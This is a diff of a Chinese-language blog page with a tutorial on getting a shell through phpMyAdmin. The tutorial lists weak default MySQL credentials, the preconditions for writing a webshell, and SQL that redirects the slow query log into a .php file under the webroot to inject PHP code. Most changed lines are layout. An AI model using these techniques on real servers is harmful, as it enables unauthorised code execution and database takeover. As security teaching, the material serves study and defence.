@@ -439,15 +439,15 @@
         </div>
         <hr class="clearfix">
 
-        <!-- 是否加载使用自带的 prismjs.
-        <link rel="stylesheet" href="/libs/prism/prism.min.css"> -->
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
 
-        <!-- 
-         -->
 
-        <div class="card-content article-card-content">
-            <div id="articleContent">
-                <h4 id="1-phpmyadmin"><a href="#1-phpmyadmin" class="headerlink" title="1. phpmyadmin"></a>1. phpmyadmin</h4><p>phpMyAdmin 是一个用 PHP 编写的开源工具，旨在通过 Web 界面管理 MySQL 和 MariaDB 数据库。</p>
+        
+
+                <div class="card-content article-card-content">
+                    <div id="articleContent">
+                        <h4 id="1-phpmyadmin"><a href="#1-phpmyadmin" class="headerlink" title="1. phpmyadmin"></a>1. phpmyadmin</h4><p>phpMyAdmin 是一个用 PHP 编写的开源工具，旨在通过 Web 界面管理 MySQL 和 MariaDB 数据库。</p>
 <h4 id="2-getshell"><a href="#2-getshell" class="headerlink" title="2. getshell"></a>2. getshell</h4><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250113162904.png" alt="image.png"></p>
 <h4 id="2-1-弱口令"><a href="#2-1-弱口令" class="headerlink" title="2.1 弱口令"></a>2.1 弱口令</h4><p>root:root<br>root:(space)<br>mysql:mysql</p>
 <h4 id="2-2-写shell"><a href="#2-2-写shell" class="headerlink" title="2.2  写shell"></a>2.2  写shell</h4><p>(1) 当前的数据库用户有写权限<br>(2) 知道web绝对路径<br>(3) web路径能写 secrue_file_priv不被设置</p>
@@ -493,11 +493,11 @@
 
 <p>相当于把mysql的日志功能给利用上了，将日志文件指定成php文件，再利用web的绝对路径然后进行解析.</p>
 <h4 id="4-慢查询日志"><a href="#4-慢查询日志" class="headerlink" title="4. 慢查询日志"></a>4. 慢查询日志</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> slow_query_log<span class="operator">=</span><span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%slow%&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/slow.php&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span> <span class="keyword">from</span> mysql.db <span class="keyword">where</span> sleep(<span class="number">10</span>);</span><br></pre></td></tr></table></figure>
-                    
-            </div>
-            <hr />
+                            
+                    </div>
+                    <hr />
 
-            
+                    
 
     <div class="reprint" id="reprint-statement">
         
@@ -551,23 +551,23 @@
 
 
 
-                <div class="tag_share" style="display: block;">
-                    <div class="post-meta__tag-list" style="display: inline-block;">
-                        
-                            <div class="article-tag">
+                        <div class="tag_share" style="display: block;">
+                            <div class="post-meta__tag-list" style="display: inline-block;">
                                 
-                                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
-                                        <span class="chip bg-color">
-                                            漏洞分析
-                                        </span>
-                                    </a>
+                                    <div class="article-tag">
+                                        
+                                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+                                                <span class="chip bg-color">
+                                                    漏洞分析
+                                                </span>
+                                            </a>
+                                            
+                                    </div>
                                     
                             </div>
-                            
-                    </div>
-                    <div class="post_share"
-                        style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                        <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+                            <div class="post_share"
+                                style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                                <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
 <div id="article-share">
 
     
@@ -579,10 +579,10 @@
 
 </div>
 
-                    </div>
+                            </div>
+                        </div>
+                        
                 </div>
-                
-        </div>
     </div>
 
     
@@ -711,20 +711,23 @@
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
 
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+  
 
-<!-- 代码语言 -->
+    <!-- 代码语言 -->
+    
 
+        <!-- 代码块复制 -->
+        
+          <script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+          
 
-<!-- 代码块复制 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-
-
-<!-- 代码块收缩 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-
-
+            <!-- 代码块收缩 -->
+            
+              <script type="text/javascript"
+                src="/libs/codeBlock/codeShrink.js"></script>
+              
     </div>
     <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
         <div class="toc-widget card" style="background-color: white;">
@@ -830,7 +833,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">125.3k</span>
+                        class="white-color">125.5k</span>
             
             
             
